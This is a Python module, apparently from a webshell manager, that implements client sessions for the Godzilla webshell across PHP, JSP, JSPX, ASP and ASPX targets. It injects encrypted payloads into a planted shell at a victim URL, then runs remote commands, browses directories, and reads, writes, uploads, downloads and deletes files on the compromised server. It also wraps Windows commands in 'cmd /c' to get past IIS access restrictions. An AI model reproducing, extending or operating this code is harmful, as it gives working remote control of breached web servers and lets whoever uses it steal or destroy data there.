import os
import typing as t
import logging
from pathlib import Path

from ..core import exceptions
from ..core.base import (
    SessionInterface,
    DirectoryEntry,
    BasicInfoEntry,
    register_session,
    Option,
    OptionGroup,
    proxy_option,
)
from ..wsm_godzilla import GodzillaClient

logger = logging.getLogger("core.sessions.wsm_godzilla")

PAYLOAD_DIR = Path(__file__).parent.parent / "wsm_payloads" / "godzilla"


def _common_options() -> t.List[OptionGroup]:
    return [
        {
            "name": "Basic Connection Config",
            "options": [
                Option(
                    id="url",
                    name="URL",
                    type="text",
                    placeholder="http://xxx.com/shell.php",
                    default_value=None,
                    alternatives=None,
                ),
                Option(
                    id="password",
                    name="Pass",
                    type="text",
                    placeholder="Pass used when generating",
                    default_value="pass",
                    alternatives=None,
                ),
                Option(
                    id="key",
                    name="Key",
                    type="text",
                    placeholder="Key used when generating",
                    default_value="key",
                    alternatives=None,
                ),
                proxy_option(),
            ],
        },
        {
            "name": "Advanced Connection Config",
            "options": [
                Option(
                    id="https_verify",
                    name="Verify HTTPS Certificate",
                    type="checkbox",
                    placeholder=None,
                    default_value=False,
                    alternatives=None,
                ),
            ],
        },
    ]


class GodzillaSessionBase(SessionInterface):
    script: t.ClassVar[str]
    crypto: t.ClassVar[str]

    def __init__(self, session_conn: dict):
        self.url = session_conn["url"]
        self.raw_pass = session_conn.get("password", "pass")
        self.raw_key = session_conn.get("key", "key")
        self.proxy = session_conn.get("proxy") or None
        self.verify = session_conn.get("https_verify", False)
        self.client = GodzillaClient(
            url=self.url,
            raw_pass=self.raw_pass,
            raw_key=self.raw_key,
            script=self.script,
            crypto=self.crypto,
            proxy=self.proxy,
            verify=self.verify,
        )

    def _payload(self) -> bytes:
        if self.script == "php":
            path = PAYLOAD_DIR / "php" / "enpayloadv4.php"
        elif self.script == "asp":
            path = PAYLOAD_DIR / "asp" / "enpayload.asp"
        elif self.script == "aspx":
            path = PAYLOAD_DIR / "csharp" / "enpayload.dll"
        else:
            path = PAYLOAD_DIR / "java" / "enpayloadv4.class"
        data = path.read_bytes()
        if b"FLAG_STR" in data:
            data = data.replace(b"FLAG_STR", os.urandom(8).hex().encode())
        return data

    async def _ensure_payload(self):
        if not self.client._injected:
            await self.client.inject_payload(self._payload())

    async def test_usablility(self) -> bool:
        try:
            await self._ensure_payload()
            return await self.client.ping()
        except Exception as exc:
            logger.debug("Godzilla ping failed: %s", exc)
            return False

    async def get_basicinfo(self) -> t.List[BasicInfoEntry]:
        await self._ensure_payload()
        info = await self.client.basicinfo()
        mapping = {
            "当前目录": "CurrentDir",
            "盘符": "FileRoot",
            "系统信息": "OsInfo",
            "当前用户": "CurrentUser",
        }
        # 哥斯拉返回的 key 可能是英文也可能是中文，统一返回
        result: t.List[BasicInfoEntry] = []
        for k, v in info.items():
            result.append(BasicInfoEntry(key=k, value=v))
        return result

    def _translate_cmd(self, cmd: str) -> str:
        if self.script not in ("asp", "aspx"):
            return cmd
        mapping = {
            "pwd": "cd",
            "ls": "dir",
            "cat": "type",
            "clear": "cls",
            "whoami": "whoami",
            "ps": "tasklist",
            "rm": "del",
            "cp": "copy",
            "mv": "move",
            "mkdir": "md",
            "rmdir": "rd",
            "find": "dir /s",
            "grep": "findstr",
        }
        import re
        m = re.match(r"^\s*(\S+)(.*)$", cmd)
        if not m:
            return cmd
        head, tail = m.group(1), m.group(2)
        head_lower = head.lower()
        if head_lower in mapping:
            translated = mapping[head_lower] + tail
        else:
            translated = cmd
        # ASP/ASPX Godzilla 直接用 Process.Start 执行文件名，内建命令（dir/cd 等）会报找不到文件；
        # 统一用 cmd /c 包装，同时解决 IIS 默认权限下直接执行 whoami 报 Access denied 的问题。
        return f"cmd /c {translated}"

    async def execute_cmd(self, cmd: str) -> str:
        await self._ensure_payload()
        return await self.client.exec_command(self._translate_cmd(cmd))

    async def list_dir(self, dir_path: str) -> t.List[DirectoryEntry]:
        await self._ensure_payload()
        text = await self.client.list_dir(dir_path)
        lines = text.splitlines()
        entries: t.List[DirectoryEntry] = []
        if not lines or lines[0].strip() != "ok":
            return entries
        for line in lines[2:]:
            parts = line.split("\t")
            if len(parts) != 5:
                continue
            name, size_flag, _date, size, perm = parts
            entry_type = "dir" if size_flag == "0" else "file"
            entries.append(
                DirectoryEntry(
                    name=name,
                    entry_type=entry_type,  # type: ignore
                    filesize=int(size),
                    permission=perm,
                )
            )
        return entries

    async def get_file_contents(self, filepath: str, max_size: int = 1024 * 200) -> bytes:
        await self._ensure_payload()
        data = await self.client.read_file(filepath)
        if len(data) > max_size:
            raise exceptions.UserError("文件超过最大读取大小")
        return data

    async def put_file_contents(self, filepath: str, content: bytes) -> bool:
        await self._ensure_payload()
        return await self.client.write_file(filepath, content)

    async def delete_file(self, filepath: str) -> bool:
        await self._ensure_payload()
        return await self.client.delete_file(filepath)

    async def mkdir(self, dir_path: str) -> None:
        raise NotImplementedError()

    async def modify_file(
        self,
        filepath: str,
        old_str: str,
        new_str: str,
        replace_strategy: t.Union[str, None] = None,
    ) -> None:
        raise NotImplementedError()

    async def move_file(self, filepath: str, new_filepath: str) -> None:
        raise NotImplementedError()

    async def copy_file(self, filepath: str, new_filepath: str) -> None:
        raise NotImplementedError()

    async def upload_file(
        self, filepath: str, content: bytes, callback: t.Union[t.Callable, None] = None
    ) -> bool:
        return await self.client.write_file(filepath, content)

    async def download_file(
        self, filepath: str, callback: t.Union[t.Callable, None] = None
    ) -> bytes:
        return await self.client.read_file(filepath)

    async def chmod(self, filepath: str, mode: str) -> None:
        raise NotImplementedError()

    async def send_bytes_over_tcp(
        self,
        host: str,
        port: int,
        content: bytes,
        send_method: t.Union[str, None] = None,
    ) -> t.Union[bytes, None]:
        raise NotImplementedError()

    async def get_send_tcp_support_methods(self) -> t.List[str]:
        return []

    async def get_pwd(self) -> str:
        await self._ensure_payload()
        info = await self.client.basicinfo()
        return info.get("CurrentDir", "")

    async def send_http_request(
        self,
        url: str,
        method: str = "GET",
        headers: t.Optional[t.Dict[str, str]] = None,
        params: t.Optional[t.Dict[str, t.Any]] = None,
        data: t.Optional[t.Union[str, bytes]] = None,
    ) -> t.Dict[str, t.Any]:
        raise NotImplementedError()

    async def create_process(
        self,
        argv: t.List[str],
        overrides_env: t.Union[t.Dict[str, str], None] = None,
    ) -> t.Any:
        raise NotImplementedError()


# ---------- PHP ----------

@register_session
class GodzillaPhpXorBase64(GodzillaSessionBase):
    session_type = "GODZILLA_PHP_XOR_BASE64"
    readable_name = "Godzilla PHP XOR BASE64"
    script = "php"
    crypto = "PHP_XOR_BASE64"
    conn_options = _common_options()


@register_session
class GodzillaPhpXorRaw(GodzillaSessionBase):
    session_type = "GODZILLA_PHP_XOR_RAW"
    readable_name = "Godzilla PHP XOR RAW"
    script = "php"
    crypto = "PHP_XOR_RAW"
    conn_options = _common_options()


# ---------- JSP ----------

@register_session
class GodzillaJspAesBase64(GodzillaSessionBase):
    session_type = "GODZILLA_JSP_AES_BASE64"
    readable_name = "Godzilla JSP AES BASE64"
    script = "jsp"
    crypto = "JAVA_AES_BASE64"
    conn_options = _common_options()


@register_session
class GodzillaJspAesRaw(GodzillaSessionBase):
    session_type = "GODZILLA_JSP_AES_RAW"
    readable_name = "Godzilla JSP AES RAW"
    script = "jsp"
    crypto = "JAVA_AES_RAW"
    conn_options = _common_options()


# ---------- JSPX ----------

@register_session
class GodzillaJspxAesBase64(GodzillaSessionBase):
    session_type = "GODZILLA_JSPX_AES_BASE64"
    readable_name = "Godzilla JSPX AES BASE64"
    script = "jspx"
    crypto = "JAVA_AES_BASE64"
    conn_options = _common_options()


@register_session
class GodzillaJspxAesRaw(GodzillaSessionBase):
    session_type = "GODZILLA_JSPX_AES_RAW"
    readable_name = "Godzilla JSPX AES RAW"
    script = "jspx"
    crypto = "JAVA_AES_RAW"
    conn_options = _common_options()


# ---------- ASP ----------

@register_session
class GodzillaAspXorBase64(GodzillaSessionBase):
    session_type = "GODZILLA_ASP_XOR_BASE64"
    readable_name = "Godzilla ASP XOR BASE64"
    script = "asp"
    crypto = "ASP_XOR_BASE64"
    conn_options = _common_options()


@register_session
class GodzillaAspXorRaw(GodzillaSessionBase):
    session_type = "GODZILLA_ASP_XOR_RAW"
    readable_name = "Godzilla ASP XOR RAW"
    script = "asp"
    crypto = "ASP_XOR_RAW"
    conn_options = _common_options()


# ---------- ASPX ----------

@register_session
class GodzillaAspxAesBase64(GodzillaSessionBase):
    session_type = "GODZILLA_ASPX_AES_BASE64"
    readable_name = "Godzilla ASPX AES BASE64"
    script = "aspx"
    crypto = "CSHARP_AES_BASE64"
    conn_options = _common_options()


@register_session
class GodzillaAspxAesRaw(GodzillaSessionBase):
    session_type = "GODZILLA_ASPX_AES_RAW"
    readable_name = "Godzilla ASPX AES RAW"
    script = "aspx"
    crypto = "CSHARP_AES_RAW"
    conn_options = _common_options()
